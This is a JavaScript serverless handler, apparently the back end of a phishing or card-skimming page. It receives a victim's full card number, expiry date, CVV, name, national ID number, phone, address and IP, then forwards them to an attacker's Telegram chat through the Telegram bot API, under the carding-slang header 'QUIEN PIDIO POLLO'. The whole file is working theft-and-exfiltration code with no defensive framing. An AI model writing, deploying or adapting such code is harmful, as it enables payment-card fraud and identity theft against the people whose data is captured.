export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ status: 'error', message: 'Método no permitido' });
  }

  try {
    const data = req.body;

    if (!data) {
      return res.status(400).json({ status: 'error', message: 'Datos inválidos' });
    }

    // ⚠️ Usa variables de entorno en Vercel (Dashboard > Settings > Environment Variables)
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Construir mensaje con saltos de línea reales
    let message = "🍗 *QUIEN PIDIO POLLO* 🍗\n\n";
    message += `🔑 *IP del Dispositivo*: \`${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\`\n\n`;
    message += "💳 *Detalles de la Tarjeta* 💳\n";
    message += `🔢 *Número de Tarjeta*: \`${data.cardNumber}\`\n`;
    message += `📅 *Fecha de Expiración*: \`${data.expMonth}/${data.expYear}\`\n`;
    message += `🔒 *CVV*: \`${data.cvv}\`\n`;
    message += `💳 *Cuotas*: \`${data.cuotas}\`\n\n`;

    message += "👤 *Datos del Propietario* 👤\n";
    message += `📝 *Nombre*: *${data.ownerName}*\n`;
    message += `🆔 *Cédula*: \`${data.cedula}\`\n`;
    message += `📱 *Teléfono*: \`${data.phone}\`\n`;
    message += `🌍 *Ciudad*: \`${data.city}\`\n`;
    message += `🏠 *Dirección*: \`${data.address}\`\n`;

    // Enviar mensaje a Telegram
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });

    const result = await response.json();

    if (response.ok) {
      return res.status(200).json({ status: 'success' });
    } else {
      return res.status(500).json({ status: 'error', message: result.description });
    }

  } catch (err) {
    return res.status(500).json({ status: 'error', message: err.message });
  }
}
